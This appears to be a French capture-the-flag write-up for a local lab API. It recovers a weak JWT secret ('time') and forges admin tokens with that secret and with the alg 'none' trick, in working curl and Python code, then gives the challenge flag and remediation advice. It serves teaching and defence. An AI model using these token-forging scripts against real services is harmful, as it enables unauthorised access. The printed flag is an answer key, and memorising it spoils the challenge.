# Write-Up - Temporal API (JWT Manipulation)

## Reconnaissance

On accède à `http://localhost:8002` et on reçoit un JSON décrivant l'API :

```json
{
  "service": "Temporal Research Institute — API",
  "version": "3.7.1",
  "endpoints": {
    "auth": "/api/v1/auth/login",
    "profile": "/api/v1/auth/profile",
    "missions": "/api/v1/temporal/missions",
    "docs": "/docs"
  }
}
```

### Découverte des endpoints

L'API a Swagger UI activé sur `/docs` — on y trouve tous les endpoints :
- `POST /api/v1/auth/login` — authentification
- `GET /api/v1/auth/profile` — voir son profil JWT
- `GET /api/v1/temporal/missions` — lister les missions
- `GET /api/v1/temporal/missions/{id}` — détail d'une mission
- `GET /api/v1/temporal/classified` — **endpoint admin**
- `GET /api/v1/debug/health` — health check (info leak)
- `GET /api/v1/debug/token-info` — décodeur de JWT

---

## Étape 1 : Obtenir un token valide

On se connecte avec le compte guest :

```bash
curl -X POST http://localhost:8002/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "guest", "password": "guest"}'
```

Réponse :
```json
{
  "message": "Authentication successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVz...",
  "user": {
    "username": "guest",
    "role": "guest",
    "clearance_level": 0
  }
}
```

On sauvegarde le token :
```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

---

## Étape 2 : Reconnaissance avec le token

### Lister les missions
```bash
curl http://localhost:8002/api/v1/temporal/missions \
  -H "Authorization: Bearer $TOKEN"
```

On voit 4 missions. La mission 4 "OMEGA PROTOCOL" est `classified` avec `clearance_required: 5`, et le briefing est `[REDACTED]`.

### Tenter l'endpoint classified
```bash
curl http://localhost:8002/api/v1/temporal/classified \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "error": "ACCESS DENIED — Admin role required",
  "your_role": "guest",
  "required_role": "admin"
}
```

Il faut un token avec `role: "admin"`.

### Information disclosure
```bash
curl http://localhost:8002/api/v1/debug/health
```

```json
{
  "algorithm": "HS256",
  "note": "JWT tokens are signed with HMAC-SHA256. The secret is... well, it's about time."
}
```

Hint massif : le secret est lié à "time".

---

## Étape 3 : Forger un JWT admin

### Méthode A : Crack du secret (le plus réaliste)

Le hint dit "it's about time". On teste `time` comme secret :

```bash
# Avec jwt_tool
python3 jwt_tool.py "$TOKEN" -C -d wordlist.txt

# Ou simplement avec Python
python3 -c "
import jwt
token = '$TOKEN'
try:
    data = jwt.decode(token, 'time', algorithms=['HS256'])
    print('SECRET FOUND: time')
    print(data)
except:
    print('wrong')
"
```

Le secret est `time`. On forge un token admin :

```python
import jwt
import time as t

payload = {
    "sub": "admin",
    "name": "Dr. Chronos",
    "role": "admin",
    "clearance": 5,
    "department": "Temporal Command",
    "iat": int(t.time()),
    "exp": int(t.time()) + 3600,
}

forged = jwt.encode(payload, "time", algorithm="HS256")
print(forged)
```

### Méthode B : Algorithm "none" (CVE classique)

On peut aussi exploiter le fait que le serveur accepte `alg: "none"` :

```python
import base64
import json

# Header avec alg: none
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=').decode()

# Payload avec role admin
payload = base64.urlsafe_b64encode(
    json.dumps({
        "sub": "admin",
        "name": "Dr. Chronos",
        "role": "admin",
        "clearance": 5,
        "department": "Temporal Command",
        "iat": 1700000000,
        "exp": 9999999999,
    }).encode()
).rstrip(b'=').decode()

# Token sans signature
forged = f"{header}.{payload}."
print(forged)
```

> **Note :** Avec PyJWT >= 2.4.0, l'algorithm `"none"` nécessite que le serveur l'autorise explicitement, ce qui est le cas ici (`algorithms=["HS256", "none"]`).

---

## Étape 4 : Récupérer le flag

Avec le token forgé :

```bash
FORGED="<token forgé>"

# Endpoint classified
curl http://localhost:8002/api/v1/temporal/classified \
  -H "Authorization: Bearer $FORGED"
```

```json
{
  "classification": "TOP SECRET — TEMPORAL COMMAND EYES ONLY",
  "project": "OMEGA PROTOCOL",
  "authorization_code": "HIT{jwt_n0n3_4lg0_t1m3_tr4v3l_cl34r4nc3}",
  "message": "Congratulations, temporal operative. You have breached the highest clearance level."
}
```

On peut aussi accéder à la mission 4 maintenant :
```bash
curl http://localhost:8002/api/v1/temporal/missions/4 \
  -H "Authorization: Bearer $FORGED"
```

Le briefing contient aussi le flag.

---

## Flag

```
HIT{jwt_n0n3_4lg0_t1m3_tr4v3l_cl34r4nc3}
```

---

## Solutions résumées

### Chemin A : Crack secret → Forge token
```bash
# 1. Login guest
curl -X POST .../api/v1/auth/login -d '{"username":"guest","password":"guest"}'

# 2. Découvrir le hint sur /debug/health

# 3. Crack le secret "time" avec jwt_tool ou Python

# 4. Forger un JWT avec role=admin, clearance=5

# 5. GET /api/v1/temporal/classified avec le token forgé
```

### Chemin B : Algorithm "none"
```bash
# 1. Login guest, obtenir un token

# 2. Construire un token avec alg:"none", role:"admin"

# 3. Envoyer sans signature → accepté par le serveur
```

---

## Remédiation

### 1. Utiliser un secret fort
```python
# Faible
JWT_SECRET = "time"

# Fort
JWT_SECRET = os.environ.get("JWT_SECRET", secrets.token_hex(64))
```

### 2. Ne jamais accepter l'algorithme "none"
```python
# Vulnérable
jwt.decode(token, secret, algorithms=["HS256", "none"])

# Sécurisé
jwt.decode(token, secret, algorithms=["HS256"])
```

### 3. Ne pas faire confiance aux claims JWT pour l'autorisation
```python
# Le role vient du token (contrôlé par le client)
if user.get("role") != "admin": ...

# Vérifier en BDD
db_user = get_user_from_db(user["sub"])
if db_user.role != "admin": ...
```

### 4. Désactiver les endpoints de debug en production
```python
# Swagger + debug endpoints activés
docs_url="/docs"

# Désactivés en prod
docs_url=None if os.environ.get("ENV") == "production" else "/docs"
```

---

## Outils utiles

- [jwt.io](https://jwt.io) — décodeur JWT en ligne
- [jwt_tool](https://github.com/ticarpi/jwt_tool) — outil offensif JWT
- [hashcat](https://hashcat.net) — mode 16500 pour cracker les secrets JWT
- [CyberChef](https://gchq.github.io/CyberChef/) — encoder/décoder Base64

---

## Références

- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
